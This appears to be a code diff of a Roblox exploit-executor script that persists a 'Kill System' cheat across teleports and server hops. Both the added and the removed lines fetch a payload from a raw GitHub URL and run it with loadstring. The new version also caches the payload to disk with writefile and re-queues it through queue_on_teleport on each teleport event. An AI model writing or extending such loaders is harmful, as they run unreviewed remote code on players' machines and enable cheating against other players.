@@ -1,3 +1,80 @@
+-- =====================================================
+-- ✅ Persistent Payload Loader (IY-style, with writefile)
+-- =====================================================
+
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+-- Executor-agnostic helpers
+local function pick(fn) return (type(fn) == "function") and fn or nil end
+local qot = pick(rawget(getfenv(), "queue_on_teleport"))
+    or pick(rawget(getfenv(), "queueteleport"))
+    or (syn and pick(syn.queue_on_teleport))
+    or (fluxus and pick(fluxus.queue_on_teleport))
+
+-- Disk API shims
+local writefile = pick(writefile)
+local readfile  = pick(readfile)
+local isfile    = pick(isfile)
+
+-- Paths & URLs
+local PAYLOAD_URL  = "https://raw.githubusercontent.com/NotH4xor/Bahasf/main/Loader/Payload"
+local PAYLOAD_PATH = "KillSystem_Payload.lua"
+
+-- Step 1: Write payload to disk if needed
+local function ensurePayloadCached()
+    if writefile and readfile and (not isfile or not isfile(PAYLOAD_PATH)) then
+        print("[QOT] Downloading and caching payload...")
+        local ok, res = pcall(game.HttpGet, game, PAYLOAD_URL)
+        if ok and res then
+            pcall(writefile, PAYLOAD_PATH, res)
+        else
+            warn("[QOT] Failed to download payload:", res)
+        end
+    end
+end
+
+-- Step 2: Queue from disk
+local function queuePayload(reason)
+    if qot and readfile then
+        print(("[QOT] Queued payload (%s) from disk"):format(reason or ""))
+        pcall(qot, ('loadstring(readfile("%s"))()'):format(PAYLOAD_PATH))
+    elseif qot then
+        print(("[QOT] Queued payload (%s) from URL (no writefile support)"):format(reason or ""))
+        pcall(qot, ('loadstring(game:HttpGet("%s"))()'):format(PAYLOAD_URL))
+    else
+        warn("[QOT] queue_on_teleport not supported")
+    end
+end
+
+-- Prime cache + pre-queue
+ensurePayloadCached()
+queuePayload("startup")
+
+-- Backup hooks
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+
+TeleportService.TeleportInitFailed:Connect(function()
+    ensurePayloadCached()
+    queuePayload("TeleportInitFailed")
+end)
+
+Players.LocalPlayer.OnTeleport:Connect(function(state)
+    if state == Enum.TeleportState.Started then
+        ensurePayloadCached()
+        queuePayload("OnTeleport.Started")
+    elseif state == Enum.TeleportState.InProgress then
+        ensurePayloadCached()
+        queuePayload("OnTeleport.InProgress")
+    end
+end)
+
+print("✅ Persistence system ready (IY-style with file caching)")
+
+-- =====================================================
+-- 🚀 Kill System (with AttachAll, respawn monitor, etc.)
+-- =====================================================
+
 -- ✅ One-time guard (per JobId, not per session)
 if _G.KillSystemActive and _G.KillSystemActiveJobId == game.JobId then
     warn("🚫 Kill system already active in this server")
@@ -6,48 +83,6 @@ end
 _G.KillSystemActive = true
 _G.KillSystemActiveJobId = game.JobId
 
-if not game:IsLoaded() then game.Loaded:Wait() end
-
---// Executor-agnostic queue shim
-local function pick(fn)
-    return (type(fn) == "function") and fn or nil
-end
-local qot = pick(rawget(getfenv(), "queue_on_teleport"))
-    or pick(rawget(getfenv(), "queueteleport"))
-    or (syn and pick(syn.queue_on_teleport))
-    or (fluxus and pick(fluxus.queue_on_teleport))
-
---// Payload
-local PAYLOAD_URL = "https://raw.githubusercontent.com/NotH4xor/Bahasf/main/Loader/Payload"
-local function queuePayload(reason)
-    if qot then
-        print(("[QOT] Queued payload (%s)"):format(reason or "no reason"))
-        pcall(qot, ('loadstring(game:HttpGet("%s"))()'):format(PAYLOAD_URL))
-    else
-        warn("[QOT] queue_on_teleport not supported in this executor")
-    end
-end
-
--- Pre-queue immediately (IY style)
-queuePayload("startup")
-
--- Backup: also queue when teleport starts
-local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
-
-TeleportService.TeleportInitFailed:Connect(function()
-    queuePayload("TeleportInitFailed")
-end)
-
-Players.LocalPlayer.OnTeleport:Connect(function(state)
-    if state == Enum.TeleportState.Started then
-        queuePayload("OnTeleport.Started")
-    elseif state == Enum.TeleportState.InProgress then
-        queuePayload("OnTeleport.InProgress")
-    end
-end)
-
---// Services
 local HttpService       = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace         = game:GetService("Workspace")
@@ -166,6 +201,7 @@ print("✅ Kill system started (with camera crash guard)")
 -- =====================================================
 -- 🌍 ServerHop (with pre-hop requeue)
 -- =====================================================
+
 local order = "Desc"
 
 local function ServerHop()
@@ -186,6 +222,7 @@ local function ServerHop()
                 end
             end
             if chosen then
+                ensurePayloadCached()
                 queuePayload("ServerHop pre-hop")
                 TeleportService:TeleportToPlaceInstance(game.PlaceId, chosen.id)
                 return
